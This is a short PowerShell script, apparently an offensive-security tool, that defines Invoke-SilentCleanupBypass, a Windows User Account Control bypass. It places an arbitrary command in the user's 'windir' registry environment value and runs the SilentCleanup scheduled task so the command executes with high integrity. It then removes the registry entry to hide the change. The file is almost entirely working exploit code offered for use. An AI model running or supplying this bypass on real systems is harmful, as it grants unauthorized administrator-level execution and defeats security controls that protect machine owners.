<#
.SYNOPSIS
Author: Daniel Diez

.PARAMETER Command
Specifies the command you would like to run in high integrity context.
 
.EXAMPLE
Invoke-SilentCleanupBypass -Command "C:\Windows\System32\cmd.exe /c start cmd.exe"

.NOTES

#>

function Invoke-SilentCleanupBypass {

    Param (
      [Parameter(Mandatory=$True)]
      [String]$Command,
    )

    $REG = "HKCU:\Environment"
    $NAME = "windir"
    New-ItemProperty -Path $REG -Name $NAME -Value $Command -PropertyType string -Force | out-null
    Write-Host "[+] Registry entry has been created successfully!"
    Start-Sleep -s 1
    schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
    Write-Host "[+] Starting SilentCleanup"
    Start-Sleep -s 1
    Remove-ItemProperty -Path $REG -Name $NAME
    Write-Host "[+] Cleaning up registry entry"
    
}